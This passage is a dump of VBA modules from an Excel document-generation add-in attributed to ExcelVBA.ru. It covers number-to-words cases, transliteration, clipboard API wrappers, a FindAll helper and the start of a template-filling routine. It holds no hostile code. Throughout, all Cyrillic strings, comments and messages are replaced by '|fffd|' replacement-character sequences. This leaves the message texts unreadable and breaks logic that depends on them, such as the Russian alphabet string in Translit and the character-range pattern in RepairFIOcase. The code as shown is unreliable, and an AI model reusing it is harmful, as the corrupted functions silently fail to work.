        Case 90: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 100: txt = "|fffd||fffd||fffd|"
        Case 200: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 300: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 400: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 500: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 600: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 700: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 800: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 900: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End Select
    If txt <> "" Then txt2 = txt & " " Else txt2 = txt
End Sub


Function Translit(ByVal txt As String) As String        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| 2013 EducatedFool  http://excelvba.ru/code/translit
    txtRussian$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arrTranslit = Array("", "a", "b", "v", "g", "d", "e", "e", "zh", "z", "i", "y", "k", _
                        "l", "m", "n", "o", "p", "r", "s", "t", "u", "f", "kh", "ts", "tch", _
                        "sh", "sch", "", "y", "", "e", "yu", "ya")
    For iCount% = 1 To 33
        txt$ = Replace(txt$, Mid(txtRussian$, iCount%, 1), arrTranslit(iCount%), , , vbBinaryCompare)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        txt$ = Replace(txt$, UCase(Mid(txtRussian$, iCount%, 1)), UCase(arrTranslit(iCount%)), , , vbBinaryCompare)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Next
    Translit$ = txt$
End Function

Function RepairFIOcase(ByVal FIO$) As String
    On Error Resume Next
    If FIO$ = "" Then Exit Function
    Dim arr, w$
    arr = Split(FIO$)
    For i = LBound(arr) To UBound(arr)
        w = Left(arr(i), 2)
        If (Len(w) = 2) And (w Like "[|fffd|-|7e8|][|fffd|-|7e8|]") Then
            If InStr(1, w, UCase$(w), vbBinaryCompare) = 1 Then arr(i) = UCase$(arr(i))
        End If
    Next i
    RepairFIOcase = Trim(Join(arr))
End Function
Attribute VB_Name = "mod_Clipboard"
Option Explicit
Option Private Module

#If VBA7 Then
    Declare PtrSafe Function OpenClipboard Lib "USER32" (ByVal Hwnd As LongPtr) As Long
    Declare PtrSafe Function EmptyClipboard Lib "USER32" () As Long
    Declare PtrSafe Function CloseClipboard Lib "USER32" () As Long
    Declare PtrSafe Function IsClipboardFormatAvailable Lib "USER32" (ByVal wFormat As Long) As Long
    Declare PtrSafe Function GetClipBoardData Lib "USER32" Alias "GetClipboardData" (ByVal wFormat As Long) As LongPtr
    Declare PtrSafe Function SetClipboardData Lib "USER32" (ByVal wFormat As Long, ByVal hMem As LongPtr) As LongPtr
    Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
    Declare PtrSafe Function GlobalLock Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
    Declare PtrSafe Function GlobalUnlock Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
    Declare PtrSafe Function GlobalSize Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
    Declare PtrSafe Function lstrCpy Lib "kernel32" Alias "lstrcpyW" (ByVal lpString1 As LongPtr, ByVal lpString2 As LongPtr) As LongPtr
    
#Else
    Declare Function OpenClipboard Lib "user32.dll" (ByVal hwnd As Long) As Long
    Declare Function EmptyClipboard Lib "user32.dll" () As Long
    Declare Function CloseClipboard Lib "user32.dll" () As Long
    Declare Function IsClipboardFormatAvailable Lib "user32.dll" (ByVal wFormat As Long) As Long
    Declare Function GetClipboardData Lib "user32.dll" (ByVal wFormat As Long) As Long
    Declare Function SetClipboardData Lib "user32.dll" (ByVal wFormat As Long, ByVal hMem As Long) As Long
    Declare Function GlobalAlloc Lib "kernel32.dll" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
    Declare Function GlobalLock Lib "kernel32.dll" (ByVal hMem As Long) As Long
    Declare Function GlobalUnlock Lib "kernel32.dll" (ByVal hMem As Long) As Long
    Declare Function GlobalSize Lib "kernel32" (ByVal hMem As Long) As Long
    Declare Function lstrcpy Lib "kernel32.dll" Alias "lstrcpyW" (ByVal lpString1 As Long, ByVal lpString2 As Long) As Long
#End If

Public Sub SetClipboard(sUniText As String)
    Dim iStrPtr, iLen As Long, iLock
    Const GMEM_MOVEABLE As Long = &H2
    Const GMEM_ZEROINIT As Long = &H40
    Const CF_UNICODETEXT As Long = &HD
    OpenClipboard 0&
    EmptyClipboard
    iLen = LenB(sUniText) + 2&
    iStrPtr = GlobalAlloc(GMEM_MOVEABLE Or GMEM_ZEROINIT, iLen)
    iLock = GlobalLock(iStrPtr)
    lstrCpy iLock, StrPtr(sUniText)
    GlobalUnlock iStrPtr
    SetClipboardData CF_UNICODETEXT, iStrPtr
    CloseClipboard
End Sub

Public Function GetClipboard() As String
    Dim iStrPtr, iLen, iLock
    Dim sUniText As String
    Const CF_UNICODETEXT As Long = 13&
    OpenClipboard 0&
    If IsClipboardFormatAvailable(CF_UNICODETEXT) Then
        iStrPtr = GetClipBoardData(CF_UNICODETEXT)
        If iStrPtr Then
            iLock = GlobalLock(iStrPtr)
            iLen = GlobalSize(iStrPtr)
            sUniText = String$(iLen \ 2& - 1&, vbNullChar)
            lstrCpy StrPtr(sUniText), iLock
            GlobalUnlock iStrPtr
        End If
        GetClipboard = sUniText
    End If
    CloseClipboard
End Function

Private Sub TestClip()
    Range("A2").value = Empty
    SetClipboard Range("A1").value
    Range("A2").value = GetClipboard
End Sub

Attribute VB_Name = "mod_CommonFunctions"
'---------------------------------------------------------------------------------------
' Module        : mod_CommonFunctions
' |fffd||fffd||fffd||fffd||fffd|     : EducatedFool  (|fffd||fffd||fffd||fffd||fffd|)                    |fffd||fffd||fffd||fffd|: 26.03.2012
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| Excel, Word, CorelDRAW. |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
' https://ExcelVBA.ru/         Skype: ExcelVBA.ru
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: http://ExcelVBA.ru/payments
'---------------------------------------------------------------------------------------
Option Compare Text
Option Private Module

Function Chars(ByVal txt As String) As Variant
    On Error Resume Next: ReDim arr(0 To Len(txt) - 1)
    For i = LBound(arr) To UBound(arr): arr(i) = Mid(txt, i + 1, 1): Next i
    If Err Then Chars = Array() Else Chars = arr
End Function

Function SafeText(ByVal txt As String) As String
    For i = 1 To Len(txt)
        SafeText = SafeText & IIf(i = 1, "", "-") & AscW(Mid(txt, i, 1))
    Next i
End Function

Function RestoreText(ByVal txt As String) As String
    On Error Resume Next: arr = Split(txt, "-")
    For i = LBound(arr) To UBound(arr): arr(i) = ChrW(Val(arr(i))): Next i
    RestoreText = Join(arr, "")
End Function

Function TemplatesInfo(ByVal files As Collection)
    For Each item In files
        TemplatesInfo = TemplatesInfo & ";" & TemplateType(item)
    Next
    TemplatesInfo = Left(Mid(TemplatesInfo, 2), 100)
End Function

Function ColumnNameByColumnNumber(ByVal col As Long) As String
    resA1 = Application.ConvertFormula("=r1c" & col, xlR1C1, xlA1)
    ColumnNameByColumnNumber = col & " |fffd|" & Split(resA1, "$")(1) & "|fffd|"
End Function

Function FindAll(SearchRange As Range, _
                 FindWhat As Variant, _
                 Optional LookIn As XlFindLookIn = xlValues, _
                 Optional LookAt As XlLookAt = xlWhole, _
                 Optional SearchOrder As XlSearchOrder = xlByRows, _
                 Optional MatchCase As Boolean = False, _
                 Optional BeginsWith As String = vbNullString, _
                 Optional EndsWith As String = vbNullString, _
                 Optional BeginEndCompare As VbCompareMethod = vbTextCompare) As Range

    Dim FoundCell As Range, FirstFound As Range, LastCell As Range, rngResultRange As Range
    Dim XLookAt As XlLookAt, Include As Boolean, CompMode As VbCompareMethod
    Dim Area As Range, MaxRow As Long, MaxCol As Long, BeginB As Boolean, EndB As Boolean

    CompMode = BeginEndCompare
    XLookAt = LookAt: If BeginsWith <> vbNullString Or EndsWith <> vbNullString Then XLookAt = xlPart

   For Each Area In SearchRange.Areas
        With Area
            If .Cells(.Cells.Count).Row > MaxRow Then MaxRow = .Cells(.Cells.Count).Row
            If .Cells(.Cells.Count).Column > MaxCol Then MaxCol = .Cells(.Cells.Count).Column
        End With
    Next Area
    Set LastCell = SearchRange.Worksheet.Cells(MaxRow, MaxCol)
    Set FoundCell = SearchRange.Find(what:=FindWhat, after:=LastCell, _
                                     LookIn:=LookIn, LookAt:=XLookAt, _
                                     SearchOrder:=SearchOrder, MatchCase:=MatchCase)

    If Not FoundCell Is Nothing Then
        Set FirstFound = FoundCell
        Do Until False    ' Loop forever. We'll "Exit Do" when necessary.
           Include = False
            If BeginsWith = vbNullString And EndsWith = vbNullString Then
                Include = True
            Else
                If BeginsWith <> vbNullString Then
                    If StrComp(Left(FoundCell.Text, Len(BeginsWith)), _
                               BeginsWith, BeginEndCompare) = 0 Then Include = True
                End If
                If EndsWith <> vbNullString Then
                    If StrComp(Right(FoundCell.Text, Len(EndsWith)), _
                               EndsWith, BeginEndCompare) = 0 Then Include = True
                End If
            End If
            If Include = True Then
                If rngResultRange Is Nothing Then
                    Set rngResultRange = FoundCell
                Else
                    Set rngResultRange = Application.Union(rngResultRange, FoundCell)
                End If
            End If
            Set FoundCell = SearchRange.FindNext(after:=FoundCell)
            If (FoundCell Is Nothing) Then Exit Do
            If (FoundCell.Address = FirstFound.Address) Then Exit Do
        Loop
    End If
    Set FindAll = rngResultRange
End Function

Attribute VB_Name = "mod_Documents"
'---------------------------------------------------------------------------------------
' Module        : mod_Documents
' Author        : EducatedFool                     Date: 05.06.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/         Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text
Option Private Module
Public WA As Object, Main_PI As ProgressIndicator
Public Const HYPERLINK_START$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - "
Public SelectedTemplates As Collection, SelectedRowsCount&        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Public CombineXLScollection As Collection, SourceSheet As Worksheet, SourceRows As Range

Sub CreateAllDocuments()
    On Error Resume Next
    Dim msg$

    If ActiveWorkbook Is Nothing Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Sub
    End If

    Set SourceSheet = ActiveSheet

    If USE_CURRENT_FOLDER Then
        If ActiveWorkbook.Path = "" Then
            msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||6fb| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|," & _
                   vbNewLine & "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel." & vbNewLine & vbNewLine & _
                   "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| Excel |fffd||fffd||fffd||fffd| |fffd|" & ActiveWorkbook.Name & "|fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            ShowSettingsPage
            Exit Sub
        End If
    End If

    StopMacro = False
    If Dir(TEMPLATES_FOLDER$, vbDirectory) = "" Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & TEMPLATES_FOLDER$
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Debug.Print "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If

    If USE_CURRENT_FOLDER Then
        MkDir OUTPUT_FOLDER$
        Err.Clear
        If Dir(OUTPUT_FOLDER$, vbDirectory) = "" Then
            msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.    " & _
                   vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & OUTPUT_FOLDER$
            MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
            ShowSettingsPage
            Exit Sub
        End If
    End If


    Dim TemplatesFilenames As Collection, item As Variant, filename$
    Set TemplatesFilenames = FilenamesCollection(TEMPLATES_FOLDER$)

    If SETT.GetBoolean("CheckBox_USE_TEMPLATES_WITH_NAMES_LIKE_WORKSHEET_NAME") Then
        Dim NewColl As New Collection, shname$
        shname$ = ActiveSheet.Name

        For Each item In TemplatesFilenames
            filename$ = "": filename$ = Dir(item)
            filename$ = Left(filename$, InStrRev(filename$, ".") - 1)
            If shname$ Like "*" & filename$ & "*" Then NewColl.Add item
        Next

        If NewColl.Count = 0 Then
            msg = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & _
                  "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel|fffd|" & vbNewLine & vbNewLine & _
                  "|fffd||fffd||fffd||fffd||fffd| " & TemplatesFilenames.Count & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & TEMPLATES_FOLDER$ & "|fffd|" & vbNewLine & _
                  "|fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & _
                  "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & shname$ & "|fffd|"

            MsgBox msg, vbExclamation, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

            ShowSettingsPage
            Exit Sub
        End If
        Set TemplatesFilenames = NewColl

    End If
    If Not CheckTemplateFiles(TemplatesFilenames) Then Exit Sub        ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|...

    Dim ra As Range, ro As Range, cell As Range, newRa As Range, BaseCol&, rc&
    BaseCol& = SETT.GetNumber("ComboBox_BaseColumn", 2): If BaseCol& <= 0 Or BaseCol& >= 256 Then BaseCol& = 2

    Set ra = Range(Cells(HEADER_ROW + 1, BaseCol&), Cells(Rows.Count, BaseCol&).End(xlUp))
    If ra.Row < HEADER_ROW + 1 Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & BaseCol& & vbNewLine & _
               "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
               "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
               "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        MsgBox msg, vbExclamation, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        F_Settings.MultiPage_Options.value = 2
        F_Settings.Label_BaseColumn.Font.Bold = True
        F_Settings.Label_BaseColumn.ForeColor = vbRed
        F_Settings.ComboBox_BaseColumn.SetFocus
        Exit Sub
    End If

    For Each cell In ra.Cells
        If Trim(cell) <> "" Then
            If newRa Is Nothing Then Set newRa = cell Else Set newRa = Union(newRa, cell)
        End If
    Next
    If newRa Is Nothing Then
        If SETT.GetBoolean("CheckBox_UseAllRows") Then
            msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)|fffd|" & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & BaseCol& & vbNewLine & _
                   "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        Else
